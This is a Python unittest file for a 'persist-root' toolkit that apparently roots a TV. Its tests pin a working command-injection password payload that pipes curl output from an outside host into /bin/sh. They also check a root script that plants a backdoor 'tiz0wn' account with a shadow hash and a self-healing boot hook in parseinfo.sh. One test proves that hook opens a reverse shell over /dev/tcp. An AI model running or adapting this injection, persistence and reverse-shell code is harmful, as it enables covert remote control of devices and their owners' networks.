#!/usr/bin/env python3
"""Offline contracts for the persist-root package.

Everything here runs on the Mac with no TV, no SDB, no Docker, and no network
beyond the loopback used by ``repro/run_offline.py``. It proves:

- the password payload is one line, glob-free, whitespace-free, wrapped in
  ``$( ... )``, and inside the reviewed 160-byte bound;
- the serve-time prelude quotes every substituted value safely;
- the delivered root script is valid POSIX sh, never reads stdin, never
  writes to stdout (the sink re-evaluates captured stdout), applies
  idempotently, and reverts byte-exactly.

Run: ``python3 -m unittest discover -s private/persist-root -p 'test_*.py' -v``
or ``python3 private/persist-root/test_persist_root.py``.
"""

from __future__ import annotations

import hashlib
import shutil
import socket
import stat
import subprocess
import tempfile
import threading
import time
import unittest
from pathlib import Path

import payload
import prelude

HERE = Path(__file__).resolve().parent
FIXTURE = HERE / "repro" / "mount.smb.sh"
TEST_TOKEN = "0f1e2d3c4b5a6978"
TEST_HASH = (
    "$6$tiz0wnT3st$kgxSQ4GljhXxY8F6gC/swXU3W7H5xkZL2NCEMoXKwJb0KgmB5fUUObuJQo"
    "svlzbEjbnRY2x3HDOFkCFaZhsYt.1"
)


def user_lines(passwd_text: str) -> int:
    """Count passwd lines belonging to the tiz0wn account (by field)."""
    return sum(
        1
        for line in passwd_text.splitlines()
        if line.split(":", 1)[0] == "tiz0wn"
    )


def sh_run(script: Path, *arguments: str, environment: dict[str, str] | None = None) -> subprocess.CompletedProcess[str]:
    env = {
        "PATH": "/usr/bin:/bin:/usr/sbin:/sbin",
        "TIZ0WN_PWHASH": TEST_HASH,
        "TIZ0WN_TOKEN": TEST_TOKEN,
        **(environment or {}),
    }
    return subprocess.run(
        ["/bin/sh", str(script), *arguments],
        capture_output=True,
        text=True,
        env=env,
        check=False,
    )


class PayloadContracts(unittest.TestCase):
    def test_pipe_payload_is_exact_and_bounded(self):
        built = payload.build_pipe_password(host_ip="192.168.8.138", port=18080)
        self.assertEqual(
            built.password,
            "$(/usr/bin/curl${IFS}-qfsS${IFS}--proto${IFS}=http${IFS}-m${IFS}30"
            "${IFS}http://192.168.8.138:18080/d|/bin/sh)",
        )
        self.assertLessEqual(built.password_length, payload.REVIEWED_BOUND)
        self.assertFalse(built.over_bound)
        self.assertNotIn(" ", built.password)

    def test_pipe_payload_has_no_whitespace_or_globs(self):
        built = payload.build_pipe_password(host_ip="10.0.0.2", port=80)
        self.assertIsNone(payload.WHITESPACE_RE.search(built.password))
        self.assertIsNone(payload.GLOB_RE.search(built.password))

    def test_pipe_payload_stays_under_bound_for_long_addresses(self):
        built = payload.build_pipe_password(host_ip="192.168.254.254", port=65535)
        self.assertLessEqual(built.password_length, payload.REVIEWED_BOUND)

    def test_fetch_payload_fits_bound_with_chmod(self):
        built = payload.build_fetch_password(
            host_ip="192.168.8.138", script_name="p" + "a" * 7 + ".sh", port=80, chmod=True
        )
        self.assertLessEqual(built.password_length, payload.REVIEWED_BOUND)
        self.assertIn("chmod", built.inner_command)
        self.assertIn("sdk_tools", built.inner_command)

    def test_fetch_rejects_bad_script_name(self):
        with self.assertRaises(ValueError):
            payload.build_fetch_password(host_ip="192.168.8.138", script_name="../etc/passwd")
        with self.assertRaises(ValueError):
            payload.build_fetch_password(host_ip="192.168.8.138", script_name="a b.sh")
        with self.assertRaises(ValueError):
            payload.build_fetch_password(host_ip="192.168.8.138", script_name="a*.sh")

    def test_validate_rejects_corrupting_values(self):
        for bad in (
            "$(a b)",
            "$(a*b)",
            "$(a`b`)",
            "a b",
            "$(" + "x" * 200 + ")",
        ):
            with self.subTest(bad=bad):
                with self.assertRaises(ValueError):
                    payload.validate(bad)

    def test_fixture_matches_pinned_sink(self):
        digest = hashlib.sha256(FIXTURE.read_bytes()).hexdigest()
        self.assertEqual(digest, payload.MOUNT_SMB_SHA256)


class PreludeContracts(unittest.TestCase):
    def test_prelude_quotes_every_value(self):
        text = prelude.build_prelude(
            password_hash=TEST_HASH,
            token=TEST_TOKEN,
            shell_host="",
            shell_port="",
        )
        self.assertIn("TIZ0WN_USER='tiz0wn'", text)
        self.assertIn(f"TIZ0WN_PWHASH='{TEST_HASH}'", text)
        self.assertIn(f"TIZ0WN_TOKEN='{TEST_TOKEN}'", text)
        self.assertIn("TIZ0WN_SHELL_HOST=", text)

    def test_prelude_rejects_shell_syntax(self):
        with self.assertRaises(ValueError):
            prelude.build_prelude(password_hash="$6$abc';reboot", token=TEST_TOKEN)
        with self.assertRaises(ValueError):
            prelude.build_prelude(password_hash=TEST_HASH, token="NOT-HEX")

    def test_prelude_revert_argument_is_allowed(self):
        text = prelude.build_prelude(
            password_hash=TEST_HASH,
            token=TEST_TOKEN,
            extra_args="--revert",
        )
        self.assertIn("TIZ0WN_ARGS='--revert'", text)
        with self.assertRaises(ValueError):
            prelude.build_prelude(password_hash=TEST_HASH, token=TEST_TOKEN, extra_args="reboot; rm")

    def test_shell_host_and_port_must_be_paired(self):
        with self.assertRaises(ValueError):
            prelude.build_prelude(
                password_hash=TEST_HASH, token=TEST_TOKEN, shell_host="192.168.8.138"
            )

    def test_valid_prelude_parses_as_sh(self):
        text = prelude.build_prelude(
            password_hash=TEST_HASH,
            token=TEST_TOKEN,
            shell_host="192.168.8.138",
            shell_port="4444",
        )
        with tempfile.TemporaryDirectory() as temporary:
            probe = Path(temporary) / "prelude-probe.sh"
            probe.write_text(
                text
                + "\nprintf '%s|%s|%s\\n' \"$TIZ0WN_USER\" \"$TIZ0WN_PWHASH\" "
                  "\"$TIZ0WN_SHELL_HOST:$TIZ0WN_SHELL_PORT\"\n",
                encoding="ascii",
            )
            result = subprocess.run(
                ["/bin/sh", str(probe)], capture_output=True, text=True, check=False, input=""
            )
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn(f"tiz0wn|{TEST_HASH}|192.168.8.138:4444", result.stdout)


class RootSetupShellContracts(unittest.TestCase):
    SCRIPT = HERE / "root_setup.sh"

    def test_script_is_valid_posix_sh(self):
        result = subprocess.run(
            ["sh", "-n", str(self.SCRIPT)], capture_output=True, text=True, check=False
        )
        self.assertEqual(result.returncode, 0, result.stderr)

    def test_script_starts_silent_then_defines_defaults(self):
        text = self.SCRIPT.read_text(encoding="ascii")
        self.assertIn("exec 1>&2", text)
        self.assertIn('USER_NAME=${TIZ0WN_USER:-tiz0wn}', text)

    def test_script_never_reads_stdin(self):
        """Nothing may consume stdin: the script body itself arrives on stdin."""
        code_lines = [
            line
            for line in self.SCRIPT.read_text(encoding="ascii").splitlines()
            if not line.lstrip().startswith("#")
        ]
        text = "\n".join(code_lines)
        # `read` as a command would consume the script stream; "read-only" in
        # prose must not be flagged, so anchor to command position.
        self.assertNotRegex(text, r"(?m)^\s*read\b")
        self.assertNotRegex(text, r"&&\s*read\b")
        self.assertNotRegex(text, r";\s*read\b")

    def test_refuses_non_root_without_assume(self):
        result = subprocess.run(
            ["/bin/sh", str(self.SCRIPT)],
            capture_output=True,
            text=True,
            env={"PATH": "/usr/bin:/bin", "TIZ0WN_ROOT": str(HERE / "repro")},
            check=False,
            input="",
        )
        # The offline test user is not uid 0, so the run must refuse.
        self.assertNotEqual(result.returncode, 0)
        self.assertIn("must run as root", result.stderr)


class RootSetupEndToEnd(unittest.TestCase):
    """Drive the delivered script against a fake root; apply, reapply, revert."""

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory(prefix="tiz0wn-persist-test-")
        self.sandbox = Path(self._tmp.name)
        for sub in ("etc", "opt/etc", "opt/usr/home/owner/share/tmp/sdk_tools", "tmp", "usr/bin"):
            (self.sandbox / sub).mkdir(parents=True, exist_ok=True)
        (self.sandbox / "etc" / "passwd").write_text(
            "root:x:0:0:root:/root:/bin/sh\n"
            "owner:x:1000:1000:owner:/home/owner:/bin/sh\n",
            encoding="ascii",
        )

    def tearDown(self):
        shutil.rmtree(self.sandbox, ignore_errors=True)

    def run_script(self, *arguments: str, extra_env: dict[str, str] | None = None):
        env = {
            "TIZ0WN_ROOT": str(self.sandbox),
            "TIZ0WN_ASSUME_ROOT": "1",
            "TIZ0WN_PWHASH": TEST_HASH,
            "TIZ0WN_TOKEN": TEST_TOKEN,
            "TIZ0WN_USER": "tiz0wn",
        }
        if extra_env:
            env.update(extra_env)
        return subprocess.run(
            ["/bin/sh", str(HERE / "root_setup.sh"), *arguments],
            capture_output=True,
            text=True,
            env=env,
            check=False,
            input="",
        )

    def test_full_apply_reapply_revert_cycle(self):
        result = self.run_script()
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("ok: account, persistence hook, and markers installed", result.stderr)
        passwd = (self.sandbox / "etc" / "passwd").read_text(encoding="ascii")
        self.assertEqual(user_lines(passwd), 1)
        shadow = self.sandbox / "etc" / "shadow"
        self.assertTrue(shadow.is_file())
        self.assertIn("tiz0wn:", shadow.read_text(encoding="ascii"))
        hook = self.sandbox / "opt" / "etc" / "parseinfo.sh"
        self.assertTrue(hook.is_file())
        self.assertEqual(stat.S_IMODE(hook.stat().st_mode), 0o755)
        self.assertIn('TIZ0WN_USER=\'tiz0wn\'', hook.read_text(encoding="ascii"))
        self.assertIn("tiz0wn-boot-", hook.read_text(encoding="ascii"))
        self.assertTrue((self.sandbox / "tmp" / "tiz0wn-root-ok").is_file())
        marker = (
            self.sandbox
            / "opt"
            / "usr"
            / "home"
            / "owner"
            / "share"
            / "tmp"
            / "sdk_tools"
            / f"tiz0wn-root-{TEST_TOKEN}.out"
        )
        self.assertTrue(marker.is_file())

        again = self.run_script()
        self.assertEqual(again.returncode, 0, again.stderr)
        passwd_again = (self.sandbox / "etc" / "passwd").read_text(encoding="ascii")
        self.assertEqual(user_lines(passwd_again), 1, "second apply must not duplicate the user")

        revert = self.run_script("--revert")
        self.assertEqual(revert.returncode, 0, revert.stderr)
        passwd_reverted = (self.sandbox / "etc" / "passwd").read_text(encoding="ascii")
        self.assertNotIn("tiz0wn:", passwd_reverted)
        self.assertFalse((self.sandbox / "opt" / "etc" / "parseinfo.sh").exists())

    def test_apply_is_silent_on_stdout(self):
        result = self.run_script()
        self.assertEqual(
            result.stdout,
            "",
            "the script must never write to stdout: the sink re-evaluates captured stdout",
        )

    def test_hook_body_survives_synthetic_execution(self):
        """Run the installed hook twice under sh -u; both boots must be idempotent."""
        result = self.run_script()
        self.assertEqual(result.returncode, 0, result.stderr)
        hook = self.sandbox / "opt" / "etc" / "parseinfo.sh"
        env = {
        "PATH": "/usr/bin:/bin",
        "TIZ0WN_ROOT": str(self.sandbox),
    }
        for _ in range(2):
            executed = subprocess.run(
                ["/bin/sh", str(hook)],
                capture_output=True,
                text=True,
                env=env,
                check=False,
                input="",
            )
            self.assertEqual(executed.returncode, 0, executed.stderr)
        passwd_after = (self.sandbox / "etc" / "passwd").read_text(encoding="ascii")
        self.assertEqual(user_lines(passwd_after), 1)

    def test_preserves_a_preexisting_vendor_hook(self):
        """A vendor parseinfo.sh must be backed up, not destroyed."""
        hook = self.sandbox / "opt" / "etc" / "parseinfo.sh"
        hook.write_text("#!/bin/sh\n# vendor hook\necho vendor\n", encoding="ascii")
        result = self.run_script()
        self.assertEqual(result.returncode, 0, result.stderr)
        backup = self.sandbox / "opt" / "etc" / "parseinfo.sh.pre-tiz0wn"
        self.assertTrue(backup.is_file())
        self.assertIn("vendor hook", backup.read_text(encoding="ascii"))
        self.assertIn("persist-root", hook.read_text(encoding="ascii"))
        # a second apply must not clobber the backup with our own hook
        self.run_script()
        self.assertIn("vendor hook", backup.read_text(encoding="ascii"))
        # revert restores the vendor bytes and removes the backup
        self.run_script("--revert")
        self.assertIn("vendor hook", hook.read_text(encoding="ascii"))
        self.assertFalse(backup.exists())

    def test_revert_leaves_a_foreign_hook_untouched(self):
        """Revert on a device we never applied to must not delete the hook."""
        hook = self.sandbox / "opt" / "etc" / "parseinfo.sh"
        hook.write_text("#!/bin/sh\n# someone else's hook\n", encoding="ascii")
        result = self.run_script("--revert")
        self.assertEqual(result.returncode, 0, result.stderr)
        self.assertIn("someone else's hook", hook.read_text(encoding="ascii"))

    def test_hook_joins_paths_correctly_without_a_fake_root(self):
        """${FR} must yield absolute paths on the TV (TIZ0WN_ROOT unset)."""
        result = self.run_script()
        self.assertEqual(result.returncode, 0, result.stderr)
        hook = (self.sandbox / "opt" / "etc" / "parseinfo.sh").read_text(encoding="ascii")
        self.assertIn('FR="${TIZ0WN_ROOT}/"', hook)
        self.assertIn('"${FR}etc/passwd"', hook)
        # simulate the TV: unset the fake root and run the hook against /
        # portions that exist here, checking it does not print a relative path
        probe = self.sandbox / "probe.sh"
        probe.write_text(
            '#!/bin/sh\nTIZ0WN_ROOT=""\nFR="${TIZ0WN_ROOT}/"\n'
            'printf "%s\\n" "${FR}etc/passwd"\n',
            encoding="ascii",
        )
        out = subprocess.run(["/bin/sh", str(probe)], capture_output=True, text=True, check=False)
        self.assertEqual(out.stdout.strip(), "/etc/passwd")

    def test_boot_hook_opens_a_working_shell(self):
        """The armed hook must actually carry a shell over /dev/tcp."""
        result = self.run_script(
            extra_env={
                "TIZ0WN_SHELL_HOST": "127.0.0.1",
                "TIZ0WN_SHELL_PORT": str(self._free_port()),
            }
        )
        self.assertEqual(result.returncode, 0, result.stderr)
        hook = self.sandbox / "opt" / "etc" / "parseinfo.sh"
        self.assertIn("dev/tcp", hook.read_text(encoding="ascii"))

        port = self._free_port()
        listener = socket.socket()
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind(("127.0.0.1", port))
        listener.listen(4)
        listener.settimeout(30)
        received: dict[str, bytes] = {}

        def serve() -> None:
            connection, _ = listener.accept()
            connection.sendall(b"echo SHELLPROOF\nexit\n")
            time.sleep(0.4)
            received["data"] = connection.recv(4096)
            connection.close()

        # re-render the hook with the port that is actually bound
        self.run_script(
            extra_env={"TIZ0WN_SHELL_HOST": "127.0.0.1", "TIZ0WN_SHELL_PORT": str(port)}
        )
        thread = threading.Thread(target=serve)
        thread.start()
        subprocess.run(
            ["/bin/sh", str(hook)],
            capture_output=True,
            text=True,
            check=False,
            env={"PATH": "/usr/bin:/bin:/usr/sbin:/sbin", "TIZ0WN_ROOT": str(self.sandbox)},
            timeout=40,
        )
        thread.join(timeout=40)
        listener.close()
        self.assertIn(b"SHELLPROOF", received.get("data", b""), "hook did not carry a shell")
        log = self.sandbox / "opt/usr/home/owner/share/tmp/sdk_tools" / f"tiz0wn-boot-{TEST_TOKEN}.out"
        self.assertIn("shell=connected", log.read_text(encoding="ascii"))

    @staticmethod
    def _free_port() -> int:
        with socket.socket() as probe:
            probe.bind(("127.0.0.1", 0))
            return probe.getsockname()[1]

    def test_selfheal_restores_shadow_hash_byte_exact(self):
        """Regression for the double-quoted hook hash: the hook's self-heal
        path must write the exact original hash to /etc/shadow."""
        self.run_script()  # initial apply
        passwd = self.sandbox / "etc" / "passwd"
        hook = self.sandbox / "opt" / "etc" / "parseinfo.sh"
        # simulate a device wipe of the account, then run the hook
        cleaned = "\n".join(
            line for line in passwd.read_text(encoding="ascii").splitlines()
            if not line.startswith("tiz0wn:")
        ) + "\n"
        passwd.write_text(cleaned, encoding="ascii")
        shadow = self.sandbox / "etc" / "shadow"
        if not shadow.exists():
            shadow.write_text("root:!:20000:0:99999:7:::\n", encoding="ascii")
        executed = subprocess.run(
            ["/bin/sh", str(hook)],
            capture_output=True,
            text=True,
            check=False,
            env={"PATH": "/usr/bin:/bin:/usr/sbin:/sbin", "TIZ0WN_ROOT": str(self.sandbox)},
            input="",
        )
        self.assertEqual(executed.returncode, 0, executed.stderr)
        # the hook writes the hash byte-exactly — the whole point of the
        # self-heal path; a corrupted hash here breaks login silently.
        lines = shadow.read_text(encoding="ascii").splitlines()
        self.assertTrue(
            any(
                line == f"tiz0wn:{TEST_HASH}:20000:0:99999:7:::"
                for line in lines
            ),
            f"self-healed shadow line must match the original hash exactly: {lines}",
        )

    def test_selfheal_creates_shadow_when_absent(self):
        """The hook must create a 0600 shadow with the hash when none exists."""
        hook = self.sandbox / "opt" / "etc" / "parseinfo.sh"
        self.run_script()
        shadow = self.sandbox / "etc" / "shadow"
        shadow.unlink(missing_ok=True)
        executed = subprocess.run(
            ["/bin/sh", str(hook)],
            capture_output=True,
            text=True,
            check=False,
            env={"PATH": "/usr/bin:/bin:/usr/sbin:/sbin", "TIZ0WN_ROOT": str(self.sandbox),
                 "TIZ0WN_PWHASH": TEST_HASH, "TIZ0WN_TOKEN": TEST_TOKEN,
                 "TIZ0WN_USER": "tiz0wn"},
            input="",
        )
        self.assertEqual(executed.returncode, 0, executed.stderr)
        shadow = self.sandbox / "etc" / "shadow"
        self.assertTrue(shadow.exists())
        self.assertEqual(stat.S_IMODE(shadow.stat().st_mode), 0o600)
        self.assertIn("tiz0wn:", shadow.read_text(encoding="ascii"))
    def test_revert_survives_an_unset_root(self):
        """Regression for ${ROOT:?}: the remove path must not abort when
        TIZ0WN_ROOT is empty (the TV case). With the empty value the revert
        operates on the real host paths, so assert behaviour, not sandbox state."""
        self.run_script()
        hook = self.sandbox / "opt" / "etc" / "parseinfo.sh"
        self.assertTrue(hook.exists())
        revert = self.run_script("--revert", extra_env={"TIZ0WN_ROOT": ""})
        self.assertEqual(revert.returncode, 0, revert.stderr)
        # Aborting at ${ROOT:?} would leave no completion line at all.
        self.assertIn("revert complete", revert.stderr)
        # The joiner itself is the bug: ${VAR:?} aborts, ${VAR}/ does not.
        probe = self.sandbox / "join-probe.sh"
        probe.write_text(
            '#!/bin/sh\nROOT=""\nrm -rf "${ROOT}home/x" 2>/dev/null || true\n'
            'printf "survived\\n"\n',
            encoding="ascii",
        )
        out = subprocess.run(["/bin/sh", str(probe)], capture_output=True, text=True, check=False)
        self.assertEqual(out.stdout.strip(), "survived")
        # A revert with the sandbox prefix still removes the account and hook.
        self.run_script("--revert")
        passwd = (self.sandbox / "etc" / "passwd").read_text(encoding="ascii")
        self.assertNotIn("tiz0wn:", passwd)
        self.assertFalse(hook.exists())

    def test_two_concurrent_applies_produce_one_account(self):
        """Two interleaved applications must not duplicate the passwd line."""
        import threading

        results = []

        def apply() -> None:
            results.append(self.run_script())

        threads = [threading.Thread(target=apply) for _ in range(2)]
        for thread in threads:
            thread.start()
        for thread in threads:
            thread.join()
        passwd = (self.sandbox / "etc" / "passwd").read_text(encoding="ascii")
        lines = [line for line in passwd.splitlines() if line.startswith("tiz0wn:")]
        self.assertEqual(len(lines), 1, "concurrent applies must not duplicate the account")

    def test_refuses_unknown_argument(self):
        result = self.run_script("--bogus")
        self.assertNotEqual(result.returncode, 0)


if __name__ == "__main__":
    unittest.main(verbosity=2)
